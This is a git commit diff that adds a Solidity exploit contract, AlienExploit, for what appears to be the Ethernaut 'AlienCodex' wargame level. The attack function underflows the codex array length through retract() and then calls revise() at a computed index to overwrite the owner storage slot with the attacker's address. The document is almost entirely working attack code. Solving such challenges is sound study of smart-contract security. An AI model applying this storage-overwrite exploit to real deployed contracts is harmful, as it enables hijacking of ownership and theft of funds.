8956cb1388079f03a9fb7733d622fbdfc004bf3d
allarious <arjmands@ualberta.ca>
2022-09-24 21:52:25 -0600

    added the exploit contract for AlienCodex

--- contracts/AlienCodex.sol
+++ contracts/AlienCodex.sol
@@ -2,6 +2,7 @@
 pragma solidity ^0.5.0;
 
 import './helpers/Ownable.sol';
+import 'hardhat/console.sol';
 
 contract AlienCodex is Ownable {
 
@@ -29,3 +30,31 @@ contract AlienCodex is Ownable {
     codex[i] = _content;
   }
 }
+
+contract AlienExploit {
+    AlienCodex public alienContract;
+    address public owner;
+    uint256 MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
+    constructor(address _alienContractAddress) public {
+        owner = msg.sender;
+        alienContract = AlienCodex(_alienContractAddress);
+    }
+
+    function attack() public{
+        require(owner == msg.sender);
+
+        uint256 slotNumber = 1;
+        uint256 arrayStorageAddress = uint256(keccak256(abi.encodePacked(slotNumber)));
+
+        alienContract.make_contact();
+        alienContract.retract();
+        alienContract.revise(
+            MAX_INT - arrayStorageAddress + 1,
+            bytes32(uint256(uint160(owner)))
+        );
+
+    }
+
+}
+// 0x00000000000000000000000D81d19cE53621c5Da0f997830C1b97FB872C2daa
+// 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
